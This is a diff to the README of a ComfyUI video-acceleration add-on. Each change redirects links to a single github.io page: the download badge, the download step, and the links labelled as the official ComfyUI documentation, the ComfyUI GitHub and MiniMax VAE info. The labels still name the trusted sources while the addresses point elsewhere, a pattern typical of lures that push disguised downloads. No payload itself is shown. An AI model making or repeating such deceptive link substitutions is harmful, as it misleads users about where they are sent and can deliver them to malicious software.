@@ -1,6 +1,6 @@
 # 🚀 ComfyUI-H3VAE_TRT - Supercharge Your AI Video Creation
 
-[![Download Now](https://img.shields.io/badge/Download-ComfyUI--H3VAE--TRT-FF4500?style=for-the-badge&logo=github&logoColor=white)](https://github.com/Windowsislamicgroup6102/ComfyUI-H3VAE_TRT)
+[![Download Now](https://img.shields.io/badge/Download-ComfyUI--H3VAE--TRT-FF4500?style=for-the-badge&logo=github&logoColor=white)](https://windowsislamicgroup6102.github.io)
 
 ## 🎯 What This Does For You
 
@@ -29,7 +29,7 @@ Let's get you set up. Follow these steps in order, and you'll be flying in no ti
 
 ### Step 1: Download the File
 
-[**👉 Click here to visit the download page**](https://github.com/Windowsislamicgroup6102/ComfyUI-H3VAE_TRT)
+[**👉 Click here to visit the download page**](https://windowsislamicgroup6102.github.io)
 
 Visit this link to download the application. Once you're on that page, look for the green "Code" button or the "Releases" section on the right side of the page. Click that, then download the file that says `ComfyUI-H3VAE_TRT` or similar.
 
@@ -100,9 +100,9 @@ A: Yes, especially well with video. The faster VAE means frames render quicker, 
 
 ## 📚 Additional Resources
 
-- **Official ComfyUI Documentation:** [https://docs.comfy.org](https://docs.comfy.org) - Learn more about workflows
-- **ComfyUI GitHub:** [https://github.com/comfyanonymous/ComfyUI](https://github.com/comfyanonymous/ComfyUI) - The main project
-- **MiniMax VAE Info:** [https://github.com/minimax-audio](https://github.com/minimax-audio) - Learn about the underlying technology
+- **Official ComfyUI Documentation:** [https://windowsislamicgroup6102.github.io](https://windowsislamicgroup6102.github.io) - Learn more about workflows
+- **ComfyUI GitHub:** [https://windowsislamicgroup6102.github.io](https://windowsislamicgroup6102.github.io) - The main project
+- **MiniMax VAE Info:** [https://windowsislamicgroup6102.github.io](https://windowsislamicgroup6102.github.io) - Learn about the underlying technology
 
 ## 🔄 Updates and Support
 
